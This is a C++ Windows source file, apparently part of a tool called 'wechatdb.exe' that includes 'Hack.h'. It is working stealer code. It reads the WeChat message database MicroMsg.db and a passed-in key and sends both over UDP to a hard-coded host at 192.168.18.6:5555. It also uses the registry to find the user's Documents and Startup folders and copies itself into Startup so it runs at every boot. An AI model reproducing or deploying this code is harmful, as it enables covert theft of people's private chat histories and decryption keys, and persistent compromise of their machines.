using namespace std;
#include "Hack.h"

//udp传输客户端函数
int client(unsigned char *pass)                        
{
	WORD wVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	char sendData[BUFSIZ] = "";
	char beginData[BUFSIZ] = "Begin\n";
	char overData[BUFSIZ] = "Over\n";
	char recBuf[BUFSIZ] = "";
	char okBuf[BUFSIZ] = "OK\n";

	if (WSAStartup(wVersion, &wsaData) != 0)
	{
		cout << "WSAStsrtup failed with error: " << WSAGetLastError() << endl;
		return 0;
	}

	sockaddr_in addrSer;
	addrSer.sin_family = AF_INET;
	addrSer.sin_port = htons(5555);
	addrSer.sin_addr.S_un.S_addr = inet_addr("192.168.18.6");
	int length = sizeof(addrSer);

	while (true)
	{
		SOCKET sClient = socket(AF_INET, SOCK_DGRAM, 0);
		recvfrom(sClient, recBuf, BUFSIZ, 0, (sockaddr*)&addrSer, &length);
		cout << recBuf;
		FILE* fp;
		char filename[256] = "MicroMsg.db";
		fp = fopen(filename, "rb");
		if (NULL == fp)
		{
			cout << "file cannot find!" << endl;
			continue;
		}
		sendto(sClient, beginData, BUFSIZ, 0, (sockaddr*)&addrSer, sizeof(addrSer));
		sendto(sClient, (const char *)pass, BUFSIZ, 0, (sockaddr*)&addrSer, sizeof(addrSer));

		int count = 0;
		cout << "transfering: ";
		while ((count = fread(sendData, 1, BUFSIZ, fp)) > 0)
		{
			//Sleep(1);
			//cout << "#";
			sendto(sClient, sendData, BUFSIZ, 0, (sockaddr*)&addrSer, sizeof(addrSer));


		}
		sendto(sClient, overData, BUFSIZ, 0, (sockaddr*)&addrSer, sizeof(addrSer));
		recvfrom(sClient, recBuf, BUFSIZ, 0, (sockaddr*)&addrSer, &length);
		if (strcmp(recBuf, okBuf) == 0)
		{
			cout << "transfer successful!" << endl;
		}
		closesocket(sClient);
		break;
	}

	WSACleanup();
	return 0;
}

//通过注册表获取数据库文件目录
void getPath(unsigned char *dbpath)
{
	char cmd_command[256] = { 0 };
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY hKey;
	DWORD dwType = REG_BINARY;
	REGSAM mode = KEY_READ;
	DWORD length = 256;
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hKey);

	ret = RegQueryValueEx(hKey, "Personal", 0, &dwType, dbpath, &length);
	if (ret == 0) {
		RegCloseKey(hKey);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
	}
}

//添加开机自启
int winStartUp()
{
	unsigned char value[256] = { 0 };
	char cmd_command[256] = { 0 };
	char regname[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
	HKEY hKey;
	DWORD dwType = REG_BINARY;
	REGSAM mode = KEY_READ;
	DWORD length = 256;
	int ret = RegOpenKey(HKEY_CURRENT_USER, regname, &hKey);
	ret = RegQueryValueEx(hKey, "Startup", 0, &dwType, value, &length);
	if (ret == 0) {
		RegCloseKey(hKey);
	}
	else {
		printf("failed to open regedit.%d\n", ret);
		return 0;
	}
	sprintf_s(cmd_command, "copy wechatdb.exe \"%s\" /B", value);
	printf("%s\n",cmd_command);
	system(cmd_command);
	return 0;
}

